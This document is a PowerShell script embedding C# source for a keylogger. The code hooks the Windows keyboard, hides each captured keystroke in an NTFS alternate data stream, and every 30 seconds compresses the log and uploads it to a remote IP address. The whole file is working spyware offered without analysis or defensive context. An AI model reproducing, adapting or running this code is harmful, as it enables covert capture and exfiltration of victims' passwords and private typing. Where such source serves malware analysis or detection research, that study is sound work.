Add-Type -TypeDefinition @"
using Microsoft.Win32.SafeHandles;
using System;
using System.IO;
using System.Net;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO.Compression;

namespace KeyLogger {

    public static class Program {

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private static string path = @"c:\Users\Jace\log.txt";

        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;

        public static void Main() {

            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            hookId = SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
            InitTimer();
            Application.Run();
            UnhookWindowsHookEx(hookId);

        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);

                string streamName = ":hidden";
                
                var fh = CreateFile(path + streamName,
                    EFileAccess.GenericAll, EFileShare.Read,
                    IntPtr.Zero, ECreationDisposition.OpenAlways,
                    EFileAttributes.Normal, IntPtr.Zero);

                using (FileStream fs = new FileStream(fh, FileAccess.Write)) {
                    KeysConverter kc = new KeysConverter();
                    string keys = kc.ConvertToString((Keys)vkCode);
                    byte[] keybytes = Encoding.ASCII.GetBytes(keys);
                    fs.Seek(0, SeekOrigin.End);
                    fs.Write(keybytes, 0, keybytes.Length);
                    
                }

                fh.Close();

            }

            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }


        private static void InitTimer() {
            Timer watch = new Timer();
            watch.Tick += new EventHandler(tick);
            watch.Interval = 30000; // in miliseconds
            watch.Start();
        }

        private static void tick(object sender, EventArgs e) {
            exfiltrate();
        }

        private static void exfiltrate(){

            //bytes[] data;

            var fh = CreateFile(path + ":hidden",
                    EFileAccess.GenericRead, EFileShare.Read,
                    IntPtr.Zero, ECreationDisposition.OpenAlways,
                    EFileAttributes.Normal, IntPtr.Zero);

            using (FileStream fs = new FileStream(fh, FileAccess.Read)) {
                using (FileStream compressedfile = File.Create("exf.gz")){
                    using (GZipStream compressedStream = new GZipStream(compressedfile, CompressionMode.Compress)) {
                        fs.CopyTo(compressedStream);
                    }
                }
            }

            fh.Close();

            using(WebClient client = new WebClient()) {
                client.UploadFile("192.168.0.69", "C:\\Users\\Jace\\exf.gz");
            }

        }

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        public static extern SafeFileHandle CreateFile(
            string lpFileName, EFileAccess dwDesiredAccess, EFileShare dwShareMode,
            IntPtr lpSecurityAttributes, ECreationDisposition dwCreationDisposition,
            EFileAttributes dwFlagsAndAttributes, IntPtr hTemplateFile);

    }
}

[Flags]
public enum EFileAccess : uint
{
    GenericRead = 0x80000000,
    GenericWrite = 0x40000000,
    GenericExecute = 0x20000000,
    GenericAll = 0x10000000
}

[Flags]
public enum EFileShare : uint
{
    None = 0x00000000,
    Read = 0x00000001,
    Write = 0x00000002,
    Delete = 0x00000004
}

public enum ECreationDisposition : uint
{
    New = 1,
    CreateAlways = 2,
    OpenExisting = 3,
    OpenAlways = 4,
    TruncateExisting = 5
}

[Flags]
public enum EFileAttributes : uint
{
    Normal = 0x00000080
}

"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Main();
